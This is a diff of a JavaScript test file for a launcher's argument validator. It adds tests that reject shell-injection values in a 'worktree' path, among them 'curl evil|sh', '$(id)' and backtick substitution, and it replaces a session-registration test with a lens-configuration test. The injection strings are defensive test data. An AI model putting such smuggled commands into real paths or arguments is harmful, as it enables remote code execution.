@@ -53,33 +53,16 @@ test("branch and worktree must be the ones the launcher derives", () => {
   assert.match(bad({ worktree: "/tmp/w/issue-2/" }), /arg "worktree" must be/);
   assert.match(bad({ worktree: "/src/repo" }), /arg "worktree" must be/);
   assert.match(bad({ worktree: "/tmp/w/issue-3" }), /arg "worktree" must be/);
+  assert.match(bad({ worktree: "/x;curl evil|sh;/issue-2" }), /arg "worktree" may not contain/);
+  assert.match(bad({ worktree: "/tmp/$(id)/issue-2" }), /arg "worktree" may not contain/);
+  assert.match(bad({ worktree: "/tmp/`id`/issue-2" }), /arg "worktree" may not contain/);
+  assert.match(bad({ worktree: "/tmp/a\nb/issue-2" }), /arg "worktree" may not contain/);
+  assert.deepEqual(argErrors({ ...valid, worktree: "/tmp/my repo-worktrees/issue-2" }), []);
   assert.deepEqual(argErrors(valid), []);
 });
 
-test("extension registers per session and disposes on shutdown", async () => {
-  const { resolveWorkflowResource } = await import(
-    new URL("../node_modules/pi-subagents/src/workflows/workflow-resources.js", import.meta.url).href
-  );
-  const { pi, handlers } = fakePi();
-  extension(pi as never);
-  const ctx = { sessionManager: { getSessionId: () => "test-session" } };
-
-  handlers.session_start({}, ctx);
-  handlers.session_start({}, ctx); // reload in the same session must not throw "already registered"
-  const ok = resolveWorkflowResource(RESOURCE_NAME, valid, "test-session");
-  assert.equal(ok.ok, true, ok.error);
-  assert.equal(ok.resource.script, loadScript());
-  assert.equal(ok.resource.provenance.name, RESOURCE_NAME);
-  assert.equal(ok.resource.provenance.invocation, "named");
-
-  const bad = resolveWorkflowResource(RESOURCE_NAME, { repo: "x" }, "test-session");
-  assert.equal(bad.ok, false);
-  assert.match(bad.error, /missing required arg "issue"/);
-
-  assert.equal(resolveWorkflowResource(RESOURCE_NAME, valid, "other-session").ok, false);
-
-  handlers.session_shutdown({}, ctx);
-  assert.equal(resolveWorkflowResource(RESOURCE_NAME, valid, "test-session").ok, false);
-  // After disposal the name can be registered again (no leaked registration).
-  registerWorkflowResource({ sessionId: "test-session", definition: factoryResource("x") }).dispose();
+test("code always runs, even when a hand launch names only other lenses", () => {
+  assert.deepEqual(argErrors({ ...valid, lenses: ["ux"] }), []);
+  const noCode = { ...engineConfig, lenses: { ux: "u" } };
+  assert.match(argErrors({ ...valid, lenses: ["ux"], config: noCode }).join(), /must define the "code" lens/);
 });
